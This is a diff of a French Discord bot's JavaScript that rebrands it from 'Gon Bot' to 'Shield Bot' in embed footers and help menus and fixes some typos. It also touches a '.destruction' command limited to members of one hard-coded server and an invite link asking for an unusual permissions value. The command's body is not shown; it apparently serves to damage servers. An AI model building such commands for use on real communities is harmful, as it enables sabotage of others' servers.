@@ -5,7 +5,6 @@ const moment = require("moment");
  var prefix = "."
 bot.on('ready',() => {
   //invit link
-  bot.user.setAvatar("./gon.jpg")
   console.log("---------------------------")
 });  
 
@@ -32,7 +31,7 @@ bot.on('message', msg => {
   }
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
-iif (msg.content === '.destruction') {
+if (msg.content === '.destruction') {
   if(msg.channel.type === "dm") return;
 
     console.log(`Commande .destruction par ${msg.author.tag}`);
@@ -168,7 +167,7 @@ bot.on("message", message => {
     .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
     .setColor("#FFFFFF")
     .setImage(membere.user.avatarURL)
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     return message.channel.send(avatar_embed).catch(e => {});
 }  
 if(message.content.startsWith(".say")) {
@@ -204,7 +203,7 @@ bot.on("message", message => {
     .setTitle(":newspaper2: **Question de "+message.author.tag+"** :newspaper2: ")
     .setDescription("**"+question+"**")
     .addField("**Reponse**","**"+ tableauball[Math.floor(Math.random()*8)] +"**")
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     .setThumbnail(bot.user.iconURL)
     return message.channel.send(ball_embed).catch(e => {});
   }
@@ -229,7 +228,7 @@ bot.on("message", message => {
     .addField("Nombre d'emoji", message.guild.emojis.size)
     .addField("Liste Des Emojis", message.guild.emojis.map(e=>e.toString()).join(" "))
     .setThumbnail(message.guild.iconURL)
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     return message.channel.send(serverinfo_embed).catch(e => {});
   }})
 
@@ -249,7 +248,7 @@ bot.on("message", message => {
     .addField("Date de Creation Du Compte", date_de_creation_du_compte)
     .addField("Discriminator", '#'+membere2.user.discriminator)
     .addField("Tag du Membre", membere2.user.tag)
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     message.channel.send(userinfo_embed) 
  return;
   }
@@ -261,12 +260,11 @@ bot.on('guildMemberAdd', member => {
     let bienvenue_embed = new Discord.RichEmbed()
     .setColor("#FFFFFF")
     .setTitle(`Bienvenue ${member.user.username}`)
-    .setDescription("Merci d'avoir rejoins le serveurs")
-    .addField("Tu veux m'ajoutais sur ton serveur ?", "[CLIQUE ICI](https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888)")
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
+    .setDescription("Merci d'avoir rejoint le serveurs")
+    .addField("Tu veux m'ajouter sur ton serveur ?", "[CLIQUE ICI](https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888)")
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé")
     .setThumbnail(member.iconURL)
-    .setAuthor("Gon bot")
-    .setFooter("Pour rejoindre mon support [clique ici](https://discord.gg/uyQcByK)")
+    .setAuthor("Shield bot")
     prive.send(bienvenue_embed).catch(e => {});
   })
 })
@@ -436,14 +434,14 @@ bot.on("message", message => {
     if(message.channel.type === "dm") return;
 
   let aide_embed = new Discord.RichEmbed()
-  .setTitle("Aide Gon Bot")
+  .setTitle("Aide Shield Bot")
   .setURL("https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888")
-  .setDescription("Rejoindre le support 100 % Français de Gon Bot [cliquez ici](https://discord.gg/uyQcByK) :flag_fr: ")
+  .setDescription("Rejoindre le support 100 % Français de Shield Bot [cliquez ici](https://discord.gg/uyQcByK) :flag_fr: ")
 .addField(":stuck_out_tongue_winking_eye:  .fun", "Faites `.fun` afficher les commandes droles !", true)
 .addField(":tools: .moderation", "Faites `.moderation` pour afficher les commandes de modération !", true)
 .setColor("#FFFFFF")
 .addField(":electric_plug:  .utile", "Faites `.utile` pour afficher les commandes utiles", true)
-  .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+  .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
   return message.channel.send(aide_embed)
   }
   if(message.content === ".fun"){
@@ -453,11 +451,11 @@ bot.on("message", message => {
     .setTitle("FUN :stuck_out_tongue_winking_eye:")
     .addField(".rainrole", "Créer le role multicolore !!!! :gay_pride_flag: ", true)
     .addField(".rainbow", "Active le changement de couleur du role Rainbow ! :gay_pride_flag: ", true)
-    .addField(".say","Fais dire une phrase au Gon Bot", true)
+    .addField(".say","Fais dire une phrase au Shield Bot", true)
     .addField(".flip", "Jouez au pile ou face avec le bot", true)
     .addField(".8ball", "Posez une question au bot", true)
     .addField(".c", "Le bot vous revele vôtre vraie identitée...", true)
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     .setColor("#FFFFFF")
 
     return message.channel.send(fun_embed).catch(e => {});
@@ -473,7 +471,7 @@ bot.on("message", message => {
     .addField(".clear", "Supprime un certains nombre de message", true)
     .addField(".mute", "Enleve la permission d'écrire a un membre dans le salon", true)
     .addField(".unmute","Redonne la permission au membre de parler dans le salon", true)
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     .setColor("#FFFFFF")
     return message.channel.send(moderation_embed).catch(e => {});
   }
@@ -485,7 +483,7 @@ bot.on("message", message => {
     .addField(".userinfo", "Affiche des infos sur une personne")
     .addField(".avatar", "Affiche l'avatar d'une personne")
     .addField(".createinvite", "Vous donnes une invit pour rejoindre le serveur")
-    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
     .setColor("#FFFFFF")
     return message.channel.send(utile_embed).catch(e => {});
   }
